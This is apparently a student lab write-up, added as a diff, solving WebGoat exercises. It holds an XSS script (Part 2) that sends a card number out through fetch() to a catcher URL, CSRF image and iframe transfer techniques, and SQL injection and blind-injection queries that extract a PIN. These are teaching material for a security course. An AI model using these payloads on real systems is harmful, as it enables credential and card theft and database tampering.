@@ -1,0 +1,63 @@
+#Malhar Shah, 1004926912, malhar.shah@mail.utoronto.ca
+#Shadman Kaif, 1005303137, shadman.kaif@mail.utoronto.ca
+
+////Important Note:
+Part 1, 3, 5, 7 were done on Port 8090
+Part 2, 4, 6, 8 were done on Port 2722
+
+// Part 1 
+The vulnerability is that the search box on the page could be used to introduce malicious HTML code. In this example, a fake login and password prompt is loaded for the user. Erroneously, the user will enter their username and password to this login, believing that it is required to proceed. However, their login credentials will be sent directly to the attacker. An onclick Javacript function call achieves this.
+
+// Part 2
+In this part, the CC Number is stored in input1, and 3 digit access is in input2.
+The script I wrote will use vulnerability in input2 that will phish for the CC Number once the user clicks the buy button. 
+This is because of the onclick function runs the hack() function that runs this logic to store the CC Number.
+
+Readable (unencoded) version of the URL:
+<script> 
+    document.getElementsByName("input2")[0].value = "000";
+    function hack() {
+        var cardNum = document.getElementsByName("input1");
+        var vulURL = "http://localhost:2722/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + cardNum[0].value; 
+        fetch(vulURL);
+    }
+    var buyButton = document.getElementsByName("buy");
+    buyButton[0].setAttribute("onclick", "hack()");
+</script>
+
+// Part 3 
+The vulnerability is that it will include a picture whose URL leads to a malicious request. The image will load and a transfer will start once the user opens the message. A one-line Javascript image upload is enough to spark this vulnerability.
+
+The URL has Screen=1430709817 and menu=900. After the user opens the image, the URL will transfer 5000 dollars from the user.
+
+// Part 4
+This part is similar to part 3. 
+The first line for the image will load and a transfer will start once the user opens the message.
+The second image will load after to make sure that the promt confirmation will load right after the transfer request.
+This will set the transfer value to confirmed defeating the prompt by-pass.
+
+// Part 5
+The vulnerability is that the transaction token will be returned as it appears in the HTML page.
+The transfer URL would be the first place the message would go. The token value could be found on that website when the URL was accessed. The transfer would subsequently be completed by changing this URL to another URL that contained the token value and transfer value. We used two "iframes" to exploit this vulnerability. 
+
+// Part 6
+In this part, I am closing the last name field with the first '. Then I am using SQL Injection with OR logic which will always be true.
+This means that it will return all the columns regardless since the OR condition is met for all entries.
+Injecting the -- at the end ensures that the last name is accepted from the first ', and the rest of the SQL statement after that is commented out
+and is not executed as part of the query.
+The query that is run is:
+SELECT * FROM user_data WHERE last_name = '' OR 1=1 -- ';
+
+// Part 7
+This is a SQL Injection vulnerability as queries can be interfered with. 
+The first part selects user 101 and updates their salary to $999 using a simple SQL command.
+The second part inserts a database trigger which remains installed inside the database and will change the database for us automatically. For this example, we simply change the email of the user to "ece568_22s@utoronto.ca". 
+
+// Part 8
+The first query I used was:
+101 AND ((SELECT pin FROM credit WHERE cc_number = '1234123412341234') > 10000);
+Here I started with a large number, then dwindled down, until I got the message that the Account number is valid.
+
+Finally when I narrowed it between the range of 3315 to 3320, I replaced the > with = in the query to get the pin.
+101 AND ((SELECT pin FROM credit WHERE cc_number = '1234123412341234') = 3318);
+This was the final query used which returned true, meaning that the pin in table credit for the row with the cc_number of 1234123412341234 is 3318.
